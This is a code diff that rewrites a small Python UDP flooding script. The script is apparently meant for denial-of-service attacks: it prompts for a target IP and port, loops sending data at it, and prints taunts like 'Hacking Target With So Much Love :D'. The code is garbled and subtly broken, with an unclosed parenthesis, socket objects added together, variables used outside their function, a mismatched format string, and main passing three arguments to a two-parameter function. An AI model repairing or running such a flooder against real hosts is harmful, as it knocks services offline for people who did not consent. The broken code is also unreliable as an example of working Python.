@@ -1,31 +1,24 @@
 import socket
 import time
 import sys
-import os
-import argparse
-import requests
 
-red = '\033[1;91m'
-blue = '\033[1;34m'
-green = '\033[1;32m'
-time.sleep(0.5)
-print('DDOS WITH 7 LAYER')
+trgt = raw_input("IP : ")
+port = input("Port : ")
+
+def flood(trgt, port):
+    udp1 = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    udp2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM
+    udp = udp1 + udp2
+    bytes = 6000000
+    send = 500
+
+while 2:
     pass
-    trgt = raw_input('IP Target : ')
-    port = raw_input('Port : ')
-    
-    while True:
-        try:
-           bytes = raw_input('Bytes : ')
-           send = 5000
-        except KeyboardInterrupt:
-            exit()
-        def destroy(trgt, port):
-            pass
-        while True:
-            pass
-            udp = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-            udp2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            up = udp + udp2
-            up.sendall(bytes, (trgt, port))
-            print('Burning Server..')
+    udp.sendto(bytes, (trgt, port))
+    send = send + 2
+    print "Hacking Target With So Much Love :D"%(send, trgt, port)
+
+def main():
+    flood(sys.argv[1], int(sys.argv[2]), int(sys.argv[3]))
+if __name__ == '__main__':
+    main()
